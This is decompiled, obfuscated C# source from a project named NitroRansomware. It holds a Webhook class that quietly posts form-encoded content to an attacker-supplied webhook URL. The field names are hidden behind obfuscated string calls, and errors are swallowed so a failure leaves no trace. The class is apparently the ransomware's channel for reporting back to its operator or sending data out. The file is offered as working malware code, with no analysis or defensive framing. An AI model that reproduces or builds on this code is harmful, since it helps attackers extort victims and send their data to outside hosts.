using System;
using System.Collections.Generic;
using System.Net.Http;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace NitroRansomware;

internal class Webhook
{
	private string webhook;

	public Webhook(string userWebhook)
	{
		hHEYokUTtehNq5ji0d.LQgF529zBT6Ox();
		base._002Ector();
		webhook = userWebhook;
	}

	public void Send(string content)
	{
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		Dictionary<string, string> dictionary = new Dictionary<string, string>
		{
			{
				WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5440),
				content
			},
			{
				WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5458),
				WP6RZJql8gZrNhVA9v.L3hoFlcqP6(996)
			},
			{
				WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5478),
				WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5502)
			}
		};
		try
		{
			HttpClient val = new HttpClient();
			try
			{
				val.PostAsync(webhook, (HttpContent)new FormUrlEncodedContent((IEnumerable<KeyValuePair<string, string>>)dictionary)).GetAwaiter().GetResult();
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
	}

	static Webhook()
	{
		WP6RZJql8gZrNhVA9v.iXLoKRSpAw();
	}
}
